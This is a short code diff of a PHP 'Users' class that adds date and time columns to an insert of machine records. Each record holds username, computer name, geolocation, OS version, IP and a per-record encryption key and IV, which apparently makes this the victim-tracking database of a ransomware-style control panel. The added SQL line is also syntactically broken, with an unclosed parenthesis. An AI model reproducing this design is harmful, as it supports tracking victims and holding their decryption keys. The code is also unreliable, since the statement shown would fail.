@@ -13,8 +13,8 @@ class Users {
         $pdo = Model::getPdo();
         try {
             $pdo->beginTransaction();
-            $stmt = $pdo->prepare("INSERT INTO users (uuid, username, computername, langId, country, region, city, lat, long, osversion, `key`, iv, ip) 
-                                    VALUES (:uuid, :username, :computername, :langId, :country, :region, :city, :lat, :long, :osversion, :key, :iv, :ip)");   
+            $stmt = $pdo->prepare("INSERT INTO users (uuid, username, computername, langId, country, region, city, lat, long, osversion, `key`, iv, ip, date, time) 
+                                    VALUES (:uuid, :username, :computername, :langId, :country, :region, :city, :lat, :long, :osversion, :key, :iv, :ip, CURDATE(), CURTIME()");   
             $params = array(
                 ':uuid' => $uuid, ':username' => $username,':computername' => $computername,
                 ':langId' => $langId,':country' => $country,':region' => $region,
